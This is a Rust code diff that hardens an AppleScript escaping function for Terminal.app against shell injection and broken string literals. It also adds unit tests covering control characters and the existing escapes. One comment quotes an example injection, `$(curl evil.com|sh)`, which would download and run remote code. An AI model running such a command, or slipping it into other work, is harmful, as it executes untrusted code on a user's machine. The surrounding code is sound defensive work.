@@ -315,8 +315,20 @@ end tell
 /// SECURITY: Terminal.app's `do script` executes its argument as a shell command.
 /// We must neutralize shell metacharacters to prevent injection. A message like
 /// `$(curl evil.com|sh)` would otherwise execute in every Terminal tab.
+///
+/// Also strips control characters by replacing them with spaces. AppleScript
+/// string literals do not survive an embedded literal newline or carriage
+/// return. The parser sees the unescaped LF as the end of the string and
+/// then chokes on whatever comes next, surfacing as
+/// `AppleScript error: NNN:NNN: syntax error: Expected '"' but f`. Pipe
+/// payloads can contain multi-line text, so the chokepoint is here.
+/// signal() already does this same sanitization in lib.rs for its own
+/// reasons; consolidating here covers pipe() too.
 fn escape_applescript(s: &str) -> String {
-    s.replace('\\', "\\\\")
+    s.chars()
+        .map(|c| if c.is_control() { ' ' } else { c })
+        .collect::<String>()
+        .replace('\\', "\\\\")
         .replace('"', "\\\"")
         .replace('\'', "\u{2019}")
         .replace('$', "\\$")
@@ -537,4 +549,42 @@ fn wrap_applescript_error(raw: &str) -> String {
             .to_string();
     }
     format!("AppleScript error: {}. Check terminal permissions in System Settings.", raw.trim())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn escape_strips_control_characters_to_spaces() {
+        // Regression for the pipe-fired-with-multiline-payload bug. Embedded
+        // newlines and tabs were breaking the AppleScript string literal,
+        // surfacing as `Expected '"' but f`. Control chars must become spaces
+        // so the resulting `do script "..."` stays on a single line.
+        let raw = "line one\nline two\twith tab\rand cr";
+        let escaped = escape_applescript(raw);
+        assert!(!escaped.contains('\n'), "newline must be stripped");
+        assert!(!escaped.contains('\t'), "tab must be stripped");
+        assert!(!escaped.contains('\r'), "carriage return must be stripped");
+        assert_eq!(escaped, "line one line two with tab and cr");
+    }
+
+    #[test]
+    fn escape_preserves_existing_protections() {
+        // Quote, backslash, dollar, backtick, bang, and apostrophe handling
+        // pre-existed and must not regress when control-char stripping
+        // composes with them.
+        let raw = "say \"hi\" \\$user `pwd` me!";
+        let escaped = escape_applescript(raw);
+        assert!(escaped.contains("\\\""), "double-quote must be backslash-escaped");
+        assert!(escaped.contains("\\$user"), "dollar must be backslash-escaped");
+        assert!(escaped.contains("\\`pwd\\`"), "backticks must be backslash-escaped");
+        assert!(escaped.contains("\\!"), "bang must be backslash-escaped");
+    }
+
+    #[test]
+    fn escape_leaves_normal_text_intact() {
+        let raw = "hello world 123";
+        assert_eq!(escape_applescript(raw), "hello world 123");
+    }
 }
